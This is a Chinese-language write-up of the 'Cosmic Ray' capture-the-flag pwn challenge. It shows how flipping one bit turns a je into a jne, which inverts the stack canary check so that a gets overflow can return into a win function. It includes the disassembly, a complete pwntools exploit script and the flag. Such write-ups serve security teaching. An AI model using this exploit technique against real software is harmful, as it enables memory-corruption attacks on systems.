# Cosmic Ray

## 题目简述

程序允许用户指定任意地址，再通过 `/proc/self/mem` 翻转该地址上一个字节中的任意一位。随后程序用 `gets` 向 40 字节栈缓冲区读取评价，存在明显的栈溢出，但二进制启用了栈 Canary。

程序未启用 PIE，并提供 `win` 函数读取 `flag.txt`。题目因此给出了两个关键原语：一次任意地址单比特写，以及一个被 Canary 阻挡的 ret2win。

## 解题过程

`main` 在 `gets` 返回后执行典型的 Canary 校验：

```asm
0x4016e7  mov rdx, qword ptr [rbp-0x8]
0x4016eb  sub rdx, qword ptr fs:0x28
0x4016f4  je  0x4016fb
0x4016f6  call __stack_chk_fail
```

地址固定是因为程序未启用 PIE。`je` 的短跳转操作码为 `0x74`，`jne` 为 `0x75`，两者只差最低位。题目的位编号从最高位 `0` 排到最低位 `7`，所以对地址 `0x4016f4` 选择位置 `7`，即可把 `0x74` 改成 `0x75`。

修改后逻辑被反转：

- Canary 未被破坏时，相减结果为零，`jne` 不跳转，反而调用 `__stack_chk_fail`。
- Canary 被溢出破坏时，相减结果非零，`jne` 跳过失败调用，函数正常执行 `ret`。

于是无需泄露 Canary，直接用 `gets` 覆盖它、保存的 `rbp` 和返回地址。官方脚本使用 56 字节填充到保存的返回地址，再跳到 `win`：

```python
from pwn import *

elf = context.binary = ELF("./cosmicray", checksec=False)
io = process(elf.path)

io.sendlineafter(b"it:\n", b"0x4016f4")
io.sendlineafter(b"):\n", b"7")

payload = flat(
    b"A" * 56,
    elf.symbols["win"],
    elf.symbols["exit"],
)
io.sendlineafter(b"today:\n", payload)
print(io.recvall().decode())
```

最终得到：

```text
SEKAI{w0w_pwn_s0_ez_wh3n_I_can_s3nd_a_c05m1c_ray_thru_ur_cpu}
```

## 方法总结

单比特写不一定要直接改控制流目标；修改安全检查本身往往更稳定。本题利用相邻条件跳转操作码只差一位，把 Canary 的“相等才通过”改成“不等才通过”，再用普通栈溢出完成 ret2win。定位位编号时必须结合题目 `byte_to_binary` 的排列方式，不能想当然地把位置 `0` 当作最低位。
